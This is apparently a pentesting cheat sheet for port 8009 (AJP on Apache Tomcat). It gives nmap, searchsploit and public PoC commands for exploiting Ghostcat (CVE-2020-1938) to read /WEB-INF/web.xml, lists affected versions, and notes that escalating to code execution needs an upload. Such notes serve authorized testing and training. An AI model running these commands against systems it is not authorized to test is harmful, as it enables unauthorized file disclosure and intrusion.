# 8009 - AJP (Apache Tomcat / Ghostcat)

## Service Usage

*AJP is a binary protocol — no plaintext client. Interact via Ghostcat PoC scripts.*

Detect + exploit Ghostcat (CVE-2020-1938)
```bash
searchsploit ghostcat
```

## 0. Fast Path (try these first)

Confirm AJP is open:
```bash
nmap -p 8009 -sV $ip
```

Check for Ghostcat (file read / LFI via AJP):
```bash
python3 ghostcat.py -H $ip -p 8009 -f /WEB-INF/web.xml
```
*(For the `ghostcat.py` PoC, `-H` = host, `-p` = AJP port, `-f` = file to read.)*

Alternative — ajpShooter (more feature-complete):
```bash
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read
```

### Common gotchas
```text
- Vulnerable Tomcat: < 9.0.31, < 8.5.51, < 7.0.100 (patched versions enforce requiredSecret).
- Ghostcat = local file read (LFI), NOT direct remote file include (RFI). RCE needs an upload primitive.
- Use eval mode (ajpShooter) only if you already uploaded a JSP-as-other-extension file.
- AJP is Tomcat's hidden backdoor — if 8009 is open, this is likely the intended path.
```
